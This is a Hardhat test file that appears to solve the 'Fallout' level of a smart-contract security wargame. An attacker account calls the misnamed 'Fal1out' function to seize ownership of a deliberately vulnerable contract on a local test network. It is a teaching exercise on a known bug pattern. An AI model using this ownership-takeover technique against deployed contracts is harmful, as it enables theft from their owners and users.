import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

const contractName = "Fallout";

async function deployFixture() {
  const [deployer, attacker] = await ethers.getSigners();
  const { provider } = ethers;

  await deployer.sendTransaction({
    value: parseEther("10"),
    to: attacker.address,
  });

  const Contract = await ethers.getContractFactory(contractName);
  const contract = await Contract.deploy();

  return { contract, deployer, attacker, provider };
}

describe(contractName, function () {
  describe("Deploy", function () {
    it("contract owner should be deployer", async function () {
      const { contract, deployer } = await loadFixture(deployFixture);
      const owner = await contract.owner();
      expect(owner).to.be.eql(deployer.address);
    });
    it("contract balance should be 0", async function () {
      const { contract, provider } = await loadFixture(deployFixture);
      const contractBalance = await provider.getBalance(contract.address);
      expect(contractBalance.toString()).to.be.eql("0");
    });
  });

  describe("Attack", function () {
    it("claim ownership of the contract below to complete this level", async function () {
      const { contract, attacker } = await loadFixture(deployFixture);
      // call the Fal1out function
      const fal1outData = await contract.populateTransaction.Fal1out();
      await attacker.sendTransaction({
        to: contract.address,
        data: fal1outData.data,
      });
      // check attacker as owner
      const owner = await contract.owner();
      expect(owner).to.be.eql(attacker.address);
    });
  });
});
